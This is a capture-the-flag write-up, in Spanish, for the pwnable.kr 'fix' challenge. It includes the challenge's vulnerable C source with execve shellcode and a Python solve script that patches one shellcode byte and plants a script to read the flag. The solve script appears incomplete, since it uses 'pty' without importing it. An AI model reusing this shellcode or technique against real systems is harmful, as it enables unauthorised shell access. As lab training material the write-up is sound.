# fix

![img](https://github.com/Calana2/Wargame_Writeups/blob/main/pwnable.kr/Legacy_Challenges/fix/fix.png)

```
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

```C
#include <stdio.h>

// 23byte shellcode from http://shell-storm.org/shellcode/files/shellcode-827.php
char sc[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
                "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

void shellcode(){
        // a buffer we are about to exploit!
        char buf[20];

        // prepare shellcode on executable stack!
        strcpy(buf, sc);

        // overwrite return address!
        *(int*)(buf+32) = buf;

        printf("get shell\n");
}

int main(){
        printf("What the hell is wrong with my shellcode??????\n");
        printf("I just copied and pasted it from shell-storm.org :(\n");
        printf("Can you fix it for me?\n");

        unsigned int index=0;
        printf("Tell me the byte index to be fixed : ");
        scanf("%d", &index);
        fflush(stdin);

        if(index > 22)  return 0;

        int fix=0;
        printf("Tell me the value to be patched : ");
        scanf("%d", &fix);

        // patching my shellcode
        sc[index] = fix;

        // this should work..
        shellcode();
        return 0;
}
```

El shellcode falla porque `esp` apunta muy cerca del shellcode y en `push eax`, lo sobreescribe. Para evitar esto se puede añadir un `leave`. Esto deja una llamada a `execve(/bin/sh, {/bin/sh, weird_file, ...}, {...})`:
```
What the hell is wrong with my shellcode??????
I just copied and pasted it from shell-storm.org :(
Can you fix it for me?
Tell me the byte index to be fixed : 15
Tell me the value to be patched : 201
get shell
/bin//sh: 0: cannot open
                         P: No such file
```

```
$ xxd error
00000000: 2f62 696e 2f2f 7368 3a20 303a 2063 616e  /bin//sh: 0: can
00000010: 6e6f 7420 6f70 656e 2083 c410 83ec 0c50  not open ......P
00000020: e8d3 a101 3a20 4e6f 2073 7563 6820 6669  ....: No such fi
00000030: 6c65 0a                                  le.
```

Podemos crear un script con ese nombre y ejecutarlo.
```py
# solve.py
import subprocess, os

# It ends up calling execve("/bin/sh",{"/bin/sh",weird_stack_string, fix_path)},env)
# Create a script file with that name
open(b'\x83\xc4\x10\x83\xec\x0cP\xe8\xd3\xa1\x01', 'wb').write(b'/bin/cat flag > result')

# Replace second "push eax" with "leave" to avoid the stack overlapping with the shellcode
"""
# >>> print(disasm(sc))
   0:   31 c0                   xor    eax, eax
   2:   50                      push   eax
   3:   68 2f 2f 73 68          push   0x68732f2f
   8:   68 2f 62 69 6e          push   0x6e69622f
   d:   89 e3                   mov    ebx, esp
   f:   50                      push   eax
  10:   53                      push   ebx
  11:   89 e1                   mov    ecx, esp
  13:   b0 0b                   mov    al, 0xb
  15:   cd 80                   int    0x80
"""
SECOND_PUSH_EAX_ADDR = 15
LEAVE = 0xc9

# Execute and get the flag
master, slave = pty.openpty()
s = subprocess.Popen(["./fix"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
s.stdin.write(f"{str(SECOND_PUSH_EAX_ADDR)}\n{str(LEAVE)}\n".encode())
```

`Sorry for blaming shell-strom.org :) it was my ignorance!`
